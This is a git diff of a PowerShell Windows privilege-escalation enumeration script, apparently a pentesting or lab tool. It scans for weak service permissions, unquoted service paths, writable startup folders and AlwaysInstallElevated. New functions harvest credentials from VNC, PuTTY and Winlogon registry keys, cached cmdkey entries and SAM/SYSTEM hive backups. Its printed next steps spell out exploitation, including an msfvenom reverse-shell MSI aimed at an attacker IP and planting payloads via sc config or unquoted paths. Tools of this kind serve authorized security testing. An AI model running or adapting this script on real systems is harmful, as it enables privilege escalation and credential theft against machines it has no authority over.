@@ -151,13 +151,14 @@ Return if the executable is modifible for user
     }
 }
 
-function Check-DirectoryPermissions {
+
+function Check-WriteDirectoryPermissions {
 <#
 .INPUTS
-Complete path for an executable
+Complete path for a folder
 
 .OUTPUTS
-Return if the directory is modified by user
+Return if the directory is write by user
 #>
     [CmdletBinding()]
     [OutputType([bool])]
@@ -173,10 +174,10 @@ Return if the directory is modified by user
 
     #Execute Acceschk
     $accesschk = Get-PathAccessChk
-    $commandAccess = "$accesschk /accepteula -uwdq $env:UserName `"$ipath`""
+    $commandAccess = "$accesschk /accepteula -uwdq `"$ipath`""
     $raccchk = Invoke-Expression -Command $commandAccess
 
-    $patternPermissions = "(SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG)"
+    $patternPermissions = "RW"
     if ("$raccchk" -match $patternPermissions){
             
         #check groups in service
@@ -281,7 +282,7 @@ function Check-InsecureServices {
     if ($result -eq $true){
         write-host "  + Possible escalation of privileges" -ForegroundColor green
         write-host "  Next Steps:"
-        write-host "   1. Search for the name of the service with SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG permissions in accesscheck.txt file generated"
+        write-host "   1. Search for the name of the service with SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG permissions in accesscheckInsecureServices.txt file generated"
         write-host "   2. See if it is launched with LocalSystem and Start_Type: 3: sc qc [service_name]"
         write-host "   3. Change config: sc config [service_name] binpath=[payload]"
     } else {
@@ -318,26 +319,35 @@ function Check-UnquotedPathServices {
                 $splitpathslash = $oneservice.pathname.Substring(0, $oneservice.pathname.ToLower().IndexOf('.exe') + 4).Split('\')
 
                 # Check write permissions
-                # C:\PrivEsc\accesschk.exe /accepteula -uwdq $env:UserName "C:\Program Files\Unquoted Path Service\"
+                # C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
 
                 $concatpatharray = @()
 
                 if ($splitpathblank.Length -gt 2) {
                     $servresult += ( "  (-) Name: " + $oneservice.Name + " --- " +  "Path: " + $oneservice.PathName)
                     
-                    for ($i=0;$i -lt $splitpathslash.Length; $i++) {
-                        $concatpatharray += $splitpathslash[0..$i] -join '\'
-                    }
-                    # Delete last element (.exe file)
-                    $newconcatpatharray = $concatpatharray[0..($concatpatharray.Length-2)]
+                    #Check if the service is associated with LocalSystem
+                    $pserv = Check-LocalSystemServicePriv $oneservice.Name
+                    if ($pserv){
+
+                        for ($i=0;$i -lt $splitpathslash.Length; $i++) {
+                            $concatpatharray += $splitpathslash[0..$i] -join '\'
+                        }
+                        # Delete last element (.exe file)
+                        $newconcatpatharray = $concatpatharray[0..($concatpatharray.Length-2)]
                     
-                    # Check write permissions in paths
-                    $accesschk = Get-PathAccessChk
-                    foreach($ipath in $newconcatpatharray){
-                        $commandAccess = "$accesschk /accepteula -uwdq $env:UserName `"$ipath`""
-                        $raccchk = Invoke-Expression -Command $commandAccess
-                        $raccchk | Out-File -FilePath "$scriptPath\results\accesscheckUnquotedPath.txt" -Append
+                        # Check write permissions in paths
+                        $accesschk = Get-PathAccessChk
+                        foreach($ipath in $newconcatpatharray){
+                            # Check RW for user o included groups
+                            $pwrite = Check-WriteDirectoryPermissions $ipath
+                            if ($pwrite){
+                                $raccchk | Out-File -FilePath "$scriptPath\results\accesscheckUnquotedPath.txt" -Append
+                            }
+                        
+                        }
                     }
+
                 }
             }
         }
@@ -351,13 +361,12 @@ function Check-UnquotedPathServices {
             # Write method
             if ($result -eq $true){
                 write-host "  + Possible escalation of privileges" -ForegroundColor green
-                write-host "  Possible vulnerable name services:" 
+                write-host "  Possible vulnerable name services run with LocalSystem:" 
                 write-host $servresult
                 write-host "  Next Steps:"
-                write-host "   1. Search SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG permissions: sc.exe qc [service_name] "
-                write-host "   2. Check if it is launched with LocalSystem and Start_Type: 3"
-                write-host "   3. Check write permissions in the split path folders services. Search RW in file accesscheckUnquotedPath.txt"
-                write-host "   4. Place the payload in the indicated path. Rename it with the letters up to the next found space."
+                write-host "   1. Check if it is launched with Start_Type: 3"
+                write-host "   2. The folders listed under accesscheckUnquotedPath.txt have write permissions for the user"
+                write-host "   3. Place the payload in the indicated path. Rename it with the letters up to the next found space."
             } else {
                write-host "  - Not possible escalation of privileges" -ForegroundColor red 
             }
@@ -381,10 +390,8 @@ function Check-WeakRegistryPermissions{
 
     $commandAccess="$accesschk /accepteula $env:UserName -uvwqks HKLM\System\CurrentControlSet\Services"
     $raccchk = Invoke-Expression -Command $commandAccess
-    #$raccchk | Out-File -FilePath "$scriptPath\results\AchkWeakRegistryPermissions.txt"
 
     #Servicios que posee el permiso KEY_ALL_ACCESS
-    #$vulnServices = Select-String -Path "$scriptPath\results\AchkWeakRegistryPermissions.txt" -Pattern 'KEY_ALL_ACCESS' -AllMatches -Context 1 | % { ($_.context.precontext)[0] }
     $posvulnServices = $raccchk | Select-String -Pattern 'KEY_ALL_ACCESS' -AllMatches -Context 1 | % { ($_.context.precontext)[0] }
 
     #Check if the user can start and stop the service
@@ -554,7 +561,7 @@ function Check-TaskScheduled{
                     # execute acceschk
                     foreach($ipath in $newconcatpatharray){
 
-                        $okwritedir = Check-DirectoryPermissions $ipath
+                        $okwritedir = Check-WriteDirectoryPermissions $ipath
 
                         if ($okwritedir -eq $True){
                             $vulnservUnquoted.add("$taskname","$ipath")
@@ -604,7 +611,7 @@ function Check-TaskScheduled{
         }
         write-host "   1. Obtain the service with the path (careful with env variables): Get-WmiObject win32_service | Select Name, PathName | Where-Object {`$_.pathname -eq `"[ExecutablePath]`"} "
         write-host "   2. Check if the service execute with LocalSystem Privs: sc.exe qc [servicename]"
-        write-host "   3. Check write permissions in the split path folders services. Search RW in file AccChk_TaskUnquotedPath.txt"
+        write-host "   3. Check write permissions in the split path folders services: AccChk_TaskUnquotedPath.txt"
         write-host "   4. Place the payload in the indicated path. Rename it with the letters up to the next found space."
         write-host "   5. Wait task"
     }else {
@@ -652,13 +659,13 @@ function Check-Autoruns{
         }
 
         foreach($v in $namesubkeys.GetValueNames()){
-            $service = $namesubkeys.GetValue($v)
+            $servicePath = $namesubkeys.GetValue($v)
 
             #Check permissions service
-            $incorrectPerm = Check-IncorrectFilePermissions $service
+            $incorrectPerm = Check-IncorrectFilePermissions $servicePath
 
             if($incorrectPerm){
-                $servVuln += $service
+                $servVuln += $servicePath
             }
         }
     }
@@ -714,7 +721,7 @@ function Check-AlwaysInstallElevated {
     # Write method
     if ($result -eq $true){
         write-host "  + Possible escalation of privileges" -ForegroundColor green
-        write-host "AlwaysInstallElevated is activated"
+        write-host "   AlwaysInstallElevated is activated"
         write-host "   1. Create a reverse shell msi: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerip] LPORT=[attackerport] -f msi -o reverse.msi"
         write-host "   2. Download file in windows and execute: msiexec /quiet /qn /i reverse.msi"
     } else {
@@ -722,6 +729,257 @@ function Check-AlwaysInstallElevated {
     }
 
 
+}
+
+function Check-InsecureGUIApps{
+    [CmdletBinding()]
+	param()
+    
+    write-host "`n"
+    write-host "[*] Check insecure gui apps executing"
+
+    #Return variable
+    $result = $false
+
+    $computer = hostname
+    $pattern = "($computer|\SYSTEM)"
+
+    # save running with other users or system
+    $taskexec =  tasklist /v | Select-String  -notmatch "$env:Username" | Select-String -Pattern $pattern
+    $taskexec | Out-File -FilePath "$scriptPath\results\InsecureGUIApps.txt" -Append
+
+    if (-not ([string]::IsNullOrEmpty($taskexec))){
+      $result = $true  
+    }
+
+    # Write method
+    if ($result -eq $true){
+        write-host "  + Possible escalation of privileges" -ForegroundColor green
+        write-host "   Applications running under other users' or SYSTEM privileges: CheckInsecureGUIApps.txt"
+        write-host "   1. Check if any user is in Admin group: net user [user]"
+        write-host "   2. Execute the program with privs and open file: file://c:/windows/system32/cmd.exe push ENTER"
+    } else {
+       write-host "  - Not possible escalation of privileges" -ForegroundColor red 
+    }
+}
+
+function Check-StartUpApps{
+    [CmdletBinding()]
+	param()
+    
+    write-host "`n"
+    write-host "[*] Check permissions in startup apps folder"
+
+    #Return variable
+    $result = $false
+
+    $startUpfolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+    #Check write permissions
+    $result = Check-WriteDirectoryPermissions $startUpfolder
+
+    # Write method
+    if ($result -eq $true){
+        write-host "  + Possible escalation of privileges" -ForegroundColor green
+        write-host "   StartUp machine folder is writeable"
+        write-host "   1. Generate payload, for example .exe"
+        write-host "   2. Download into folder C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+        write-host "   3. Wait to admin login"
+    } else {
+       write-host "  - Not possible escalation of privileges" -ForegroundColor red 
+    }
+
+
+}
+
+function Check-PasswordsFilesDir{
+    [CmdletBinding()]
+	param()
+    
+
+    #Return variable
+    $result = $false
+
+    #############
+    # Search files
+    ###############
+    write-host "  [-] Check files and directories"
+    echo "Section:Files and Directories" | Out-File -FilePath "$scriptPath\results\PossiblePasswords.txt" -Append
+
+    #Name file or directory
+    $directories = Get-ChildItem -Recurse -Path C:\ | where-object {$_.FullName}
+    $arrdir=@()
+    foreach($dir in $directories){
+        $pattern = "(.*pass.*|.*cred.*)"
+        if ($dir.fullname -match $pattern){
+            $arrdir += $dir.fullname
+        }
+    }
+    #Content
+    $pattcred = "(.*user.*|.*usu.*|.*account.*|.*pass.*)"
+    $filescpass = Get-ChildItem -recurse -include *.txt,*.config,*.ini,*.xml -Path C:\ | Select-String -pattern $pattcred
+
+    $resmatchpass = Compare-Object -ReferenceObject $arrdir -DifferenceObject $filescpass -IncludeEqual
+    $resmatchpass | Out-File -FilePath "$scriptPath\results\PossiblePasswords.txt" -Append
+    echo "------------" | Out-File -FilePath "$scriptPath\results\PossiblePasswords.txt" -Append
+
+    if (-not ([string]::IsNullOrEmpty($resmatchpass))){
+      $result = $true  
+    }
+
+    # Write method
+    if ($result -eq $true){
+        write-host "      + Possible credentials matches found" -ForegroundColor green
+        write-host "      1. Check PossiblePasswords.txt section: Files and Directories"
+    } else {
+        write-host "      |- Nothing found"
+    }
+
+}
+
+function Check-RegistryPass{
+    [CmdletBinding()]
+	param()
+    
+    write-host "   [-] Check common credentials stored in registry"
+    echo "Section:Common credentials in registry" | Out-File -FilePath "$scriptPath\results\PossiblePasswords.txt" -Append
+
+    #Return variable
+    $result = $false
+
+    #Auxiliary variables
+    $OrigError = $ErrorActionPreference
+    $ErrorActionPreference = "SilentlyContinue"
+
+    # Only search in HKLM
+    $keyCommonPass = @("HKEY_LOCAL_MACHINE\SOFTWARE\TigerVNC\WinVNC4",
+                        "HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server",
+                        "HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default",
+                        "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\",
+                        "HKEY_CURRENT_USER\SOFTWARE\TightVNC",
+                        "HKEY_CURRENT_USER\SOFTWARE\TurboVNC",
+                        "HKEY_CURRENT_USER\SOFTWARE\ORL\WinVNC3\Password",
+                        "HKEY_USERS\.DEFAULT\Software\ORL\WinVNC3\Password",
+                        "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon",
+                        "HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP",
+                        "HKEY_CURRENT_USER\SOFTWARE\OpenSSH\Agent\Key",
+                        "HKEY_CURRENT_USER\SOFTWARE\\SimonTatham\PuTTY\Sessions"
+                    )
+
+    #Obtain executables for each value
+    foreach($ikey in $keyCommonPass){
+        $registryCommand= "Registry::" + $ikey
+        #To manage the registry that not exits
+        try {
+            $namesubkeys = Get-Item -Path $registryCommand
+        }catch{
+            break
+        }
+        echo $ikey | Out-File -FilePath "$scriptPath\results\PossiblePasswords.txt" -Append
+        foreach($v in $namesubkeys.GetValueNames()){
+            $pattcred = "(.*user.*|.*usu.*|.*account.*|.*pass.*)"
+            if ($v -match $pattcred){
+                $regvalue = $namesubkeys.GetValue($v)
+                $line = $v + ":" + $regvalue
+                echo $line | Out-File -FilePath "$scriptPath\results\PossiblePasswords.txt" -Append
+                $result = $true
+            }
+        }
+    }
+
+    $ErrorActionPreference = $OrigError
+    echo "------------" | Out-File -FilePath "$scriptPath\results\PossiblePasswords.txt" -Append
+    # Write method
+    if ($result -eq $true){
+        write-host "      + Possible credentials in registry found" -ForegroundColor green
+        write-host "      1. Check PossiblePasswords.txt section: Common credentials in registry"
+    } else {
+        write-host "      |- Nothing found"
+    }
+
+}
+
+function Check-RunAsCommand {
+    [CmdletBinding()]
+	param()
+    
+    write-host "   [-] Check caché credentials saved"
+    echo "Section:Cache Credentials Manager" | Out-File -FilePath "$scriptPath\results\PossiblePasswords.txt" -Append
+
+    $creds = cmdkey /list
+    echo $creds | Out-File -FilePath "$scriptPath\results\PossiblePasswords.txt" -Append
+    echo "------------" | Out-File -FilePath "$scriptPath\results\PossiblePasswords.txt" -Append
+
+    if (-not ([string]::IsNullOrEmpty($creds))){
+      $result = $true  
+    }
+
+    # Write method
+    if ($result -eq $true){
+        write-host "      + Possible credentials matches found" -ForegroundColor green
+        write-host "      1. Check PossiblePasswords.txt section: Credentials Manager"
+    } else {
+        write-host "      |- Nothing found"
+    }
+}
+
+function Check-PasswordsBackupHives{
+    [CmdletBinding()]
+	param()
+    
+
+    #Return variable
+    $result = $false
+    write-host "   [-] Check caché credentials saved"
+    $commonDirs = @("C:\Windows\repair\SAM",
+                    "C:\Windows\System32\config\RegBack\SAM",
+                    "C:\Windows\System32\config\SAM",
+                    "C:\Windows\repair\SYSTEM",
+                    "C:\Windows\System32\config\SYSTEM",
+                    "C:\Windows\System32\config\RegBack\SYSTEM"
+                    )
+
+    $acopi=@()
+    foreach($dir in $commonDirs){
+        try{
+            $check = Test-Path $dir -PathType Leaf -ErrorAction Ignore
+        }catch{
+            $check = $false
+        }
+        if ($check){
+            $acopi += $dir
+        }
+    }
+
+    if (-not ([string]::IsNullOrEmpty($acopi))){
+      $result = $true  
+    }
+
+    # Write method
+    if ($result -eq $true){
+        write-host "      + Possible credentials matches found" -ForegroundColor green
+        write-host "      1. Copied this files to work machine. It is necessary SYSTEM + SAM"
+        write-host $acopi
+    } else {
+        write-host "      |- Nothing found"
+    }
+}
+
+function Check-PasswordsPrivs{
+    [CmdletBinding()]
+	param()
+    
+    write-host "`n"
+    write-host "[*] Check presents password in the computer"
+
+    # Files
+    #Check-PasswordsFilesDir
+    #Registry
+    Check-RegistryPass
+    #Credential-Manager
+    Check-RunAsCommand
+    #Backup hives
+    Check-PasswordsBackupHives
 }
 
 #############################
@@ -737,7 +995,10 @@ function main {
     #Check-InsecureServicesExecutable
     #Check-TaskScheduled
     #Check-Autoruns
-    Check-AlwaysInstallElevated
+    #Check-AlwaysInstallElevated
+    #Check-InsecureGUIApps
+    #Check-StartUpApps
+    Check-PasswordsPrivs
 
 }
 
